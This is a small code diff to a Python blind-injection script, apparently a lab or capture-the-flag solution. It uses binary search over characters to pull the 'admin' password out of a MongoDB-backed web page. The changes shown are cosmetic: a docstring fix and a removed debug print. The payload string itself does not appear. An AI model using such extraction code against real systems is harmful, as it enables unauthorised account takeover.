@@ -32,7 +32,7 @@ def check_user(user, soup_object):
 def binary_search(alphanumeric_list, left, right, url, pwd):
     """
     Recursive function to perform binary search to inject SQL statements to a mongolDb database
-    This function finds a character that the password has then return that char
+    This function finds a character that the password has then returns that character
 
     :param alphanumeric_list: (list) list of all the ascii letters and digits
     :param left: (int) starting index
@@ -53,7 +53,6 @@ def binary_search(alphanumeric_list, left, right, url, pwd):
         return alphanumeric_list[mid]
 
     soup_obj = get_request(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]))
-    # print(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]))
 
     # Now do recursion
     if check_user('admin', soup_obj):
